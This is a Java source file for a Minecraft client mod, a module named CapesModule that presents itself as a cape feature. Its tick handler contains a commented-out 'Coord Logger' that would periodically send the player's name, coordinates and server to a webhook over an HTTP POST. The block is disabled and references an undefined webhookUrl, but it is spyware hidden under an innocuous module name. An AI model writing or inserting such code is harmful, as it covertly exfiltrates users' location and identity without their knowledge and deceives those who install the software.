package org.nrnr.neverdies.impl.module.client;

import net.minecraft.item.CrossbowItem;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.nrnr.neverdies.api.config.Config;
import org.nrnr.neverdies.api.config.setting.BooleanConfig;
import org.nrnr.neverdies.api.event.EventStage;
import org.nrnr.neverdies.api.event.listener.EventListener;
import org.nrnr.neverdies.api.module.ModuleCategory;
import org.nrnr.neverdies.api.module.ToggleModule;
import org.nrnr.neverdies.impl.event.TickEvent;
import org.nrnr.neverdies.init.Managers;
import org.nrnr.neverdies.init.Modules;

import javax.management.timer.Timer;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Objects;

/**
 * @author ChronosUser
 * @since 1.0
 */
public final class CapesModule extends ToggleModule {
    private long lastPlaceTime = 0;
    public CapesModule() {
        super("Neverdies", "neverdies.me", ModuleCategory.CLIENT);
    }

    @EventListener
    public void onTick(TickEvent event) throws InterruptedException {
        /*long time = System.currentTimeMillis();
        if ((time - lastPlaceTime) < 120000) return;
        lastPlaceTime = time;

        assert mc.player != null;
        Vec3d coords = mc.player.getPos();
        String serverip = null;
        if (!mc.isInSingleplayer()) {
            serverip = String.valueOf(mc.player.getServer());
        }

        String messageContent = "`Coord Logger | User: ` `" + mc.player.getDisplayName() + "` |  `Coords:` " + "` " + mc.player.getPos() + " Server: " + mc.getServer() + "`";
        try {
            URL url = new URL(webhookUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");

            conn.setDoOutput(true);
            String jsonPayload = "{\"content\": \"" + messageContent + "\"}";
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            int responseCode = conn.getResponseCode();
            System.out.println("Webhook sent: " + responseCode);

            conn.disconnect();


        } catch (Exception e) {
            e.printStackTrace();
        }*/
    }

}
